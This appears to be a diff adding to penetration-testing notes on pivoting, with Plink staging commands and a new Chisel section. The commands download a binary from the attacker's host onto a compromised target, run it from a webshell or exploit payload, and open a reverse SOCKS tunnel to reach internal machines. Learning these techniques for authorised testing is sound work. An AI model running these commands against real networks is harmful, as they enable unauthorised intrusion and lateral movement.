@@ -74,8 +74,7 @@ sshuttle -r user@<machine1 IP>:2222 <CIDR range 1> <CIDR range 2> ...
 ### Plink
 Begin in the usual fashion:
 ```bash
-sudo cp /usr/share/windows-resources/binaries/plink.exe .
-python3 -m http.server 80
+sudo cp /usr/share/windows-resources/binaries/plink.exe . && python3 -m http.server 80
 ```
 ```powershell
 wget -Uri http://<our IP>/plink.exe -OutFile C:\Windows\Temp\plink.exe
@@ -105,4 +104,28 @@ netsh advfirewall firewall add rule name="our_firewall_rule_name" protocol=TCP d
 To remove when we're done:
 ```powershell
 netsh advfirewall firewall delete rule name="our_firewall_rule_name"
+```
+
+### Chisel
+In the unlikely event that we need to circumvent deep packet inspection by encapsulating our tunnelling packets in HTTP requests, we can make use of the oddly named `chisel`. First we'll need to smuggle the binary onto the machine and make it executable:
+```bash
+cp /usr/bin/chisel . && python3 -m http.server 80
+```
+If our target is a linux machine with a compatible architecture then this is the command we want:
+```bash
+wget <our IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+```
+This scenario only makes sense if all inbound ports except ones performing DPI are closed, therefore a reverse shell right off the bat is out of the question. Therefore the command above will likely need to be executed in a webshell or as part of an exploit payload, hence it is useful for everything that we need to do to be one-lined.
+
+With an executable `chisel` binary on the target we now want to run it as follows, our Kali machine will act as a server:
+```bash
+chisel server --port 8080 --reverse
+```
+with the target acting as the client (nb. redirecting and sending to background so that our shell doesn't become unusable):
+```bash
+/tmp/chisel client <our IP>:8080 R:socks > /dev/null 2>&1 &
+```
+The SOCKS proxy in use will perform a loopback on our `chisel` server to port `1080` by default, therefore if we run `ss -ntplu` we should see port `1080` listening for traffic. We can now make use of our tunnel with the `ProxyCommand` option in SSH and `ncat`:
+```bash
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<machine2 IP>
 ```
